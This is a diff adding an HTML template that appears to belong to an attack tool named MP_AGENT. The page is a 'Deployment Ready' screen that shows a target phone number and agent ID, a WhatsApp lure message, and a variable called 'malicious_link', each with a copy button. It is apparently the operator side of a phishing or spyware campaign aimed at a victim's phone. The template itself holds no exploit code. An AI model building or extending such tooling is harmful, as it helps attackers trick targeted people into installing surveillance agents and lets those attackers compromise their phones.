@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Deployment Ready - MP_AGENT</title>
+    <style>
+        body { font-family: Arial; background: #1a1a1a; color: white; padding: 20px; }
+        .container { max-width: 800px; margin: 0 auto; }
+        .success-card { background: #28a745; padding: 20px; border-radius: 10px; margin-bottom: 20px; }
+        .info-card { background: #2d2d2d; padding: 20px; border-radius: 10px; margin-bottom: 15px; }
+        .link-box { background: #3d3d3d; padding: 15px; border-radius: 8px; margin: 10px 0; }
+        .link-input { width: 100%; padding: 10px; background: #2d2d2d; border: 1px solid #555; color: white; border-radius: 5px; }
+        .btn { padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; margin: 5px; }
+        .btn-copy { background: #007bff; color: white; }
+        .btn-back { background: #6c757d; color: white; text-decoration: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="success-card">
+            <h2>✅ Deployment Ready!</h2>
+            <p><strong>Target Phone:</strong> {{ target_phone }}</p>
+            <p><strong>Agent ID:</strong> {{ agent_id }}</p>
+        </div>
+        
+        <div class="info-card">
+            <h3>📱 Send WhatsApp Message</h3>
+            <div class="link-box">
+                <strong>{{ whatsapp_message }}</strong>
+            </div>
+            <button class="btn btn-copy" onclick="copyToClipboard('{{ whatsapp_message }}')">Copy Message</button>
+        </div>
+        
+        <div class="info-card">
+            <h3>🔗 Direct Link</h3>
+            <input type="text" class="link-input" value="{{ malicious_link }}" readonly id="directLink">
+            <button class="btn btn-copy" onclick="copyToClipboard('{{ malicious_link }}')">Copy Link</button>
+        </div>
+        
+        <a href="/dashboard" class="btn btn-back">← Back to Dashboard</a>
+    </div>
+
+    <script>
+        function copyToClipboard(text) {
+            navigator.clipboard.writeText(text).then(function() {
+                alert('Copied to clipboard!');
+            });
+        }
+        
+        document.getElementById('directLink').addEventListener('click', function() {
+            this.select();
+        });
+    </script>
+</body>
+</html>
